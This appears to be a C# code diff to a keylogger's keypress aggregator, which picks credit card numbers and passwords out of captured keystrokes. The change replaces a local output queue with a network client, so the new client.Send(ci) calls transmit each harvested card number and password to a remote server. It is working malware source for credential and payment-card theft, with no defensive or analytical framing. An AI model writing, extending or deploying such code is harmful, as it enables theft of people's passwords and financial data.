@@ -13,17 +13,17 @@ namespace KeypressAggregator
     class KeyPressAggergator
     {
         private ConcurrentQueue<KeyPress> inq;
-        private ConcurrentQueue<CI> outbuffer;
+        private ServerClient client;
         private string outFName;
         private string sKey;
         private bool toFile = false;
 
-        public KeyPressAggergator(ConcurrentQueue<KeyPress> q, ConcurrentQueue<CI> outbuffer)
+        public KeyPressAggergator(ConcurrentQueue<KeyPress> q, ServerClient client)
         {
+            this.client = client;
             this.inq = q;
-            this.outbuffer = outbuffer;
         }
-        public KeyPressAggergator(ConcurrentQueue<KeyPress> q, ConcurrentQueue<CI> outbuffer, string file, string key) : this(q, outbuffer)
+        public KeyPressAggergator(ConcurrentQueue<KeyPress> q,  ServerClient client, string file, string key) : this(q, client)
         {
             this.outFName = file;
             this.sKey = key;
@@ -110,7 +110,7 @@ namespace KeypressAggregator
                         creditCard = 0;
                         var ci = createCi( "CCN", creditNum);
                         Console.WriteLine("CNN: " + ci.Data);
-                        outbuffer.Enqueue(ci);
+                        client.Send(ci);
                         data = data + "DATA: " + ci.Data;
                         foundInfo = true;
                         creditNum = "";
@@ -131,8 +131,8 @@ namespace KeypressAggregator
                         if(isPswrd == true)
                         {
                             var ci = createCi("PSW", password);
+                            client.Send( ci );
                             Console.WriteLine("PSW: " + ci.Data);
-                            outbuffer.Enqueue(ci);
                             data = data + "DATA: " + ci.Data;
                             isPswrd = false;
                             password = "";
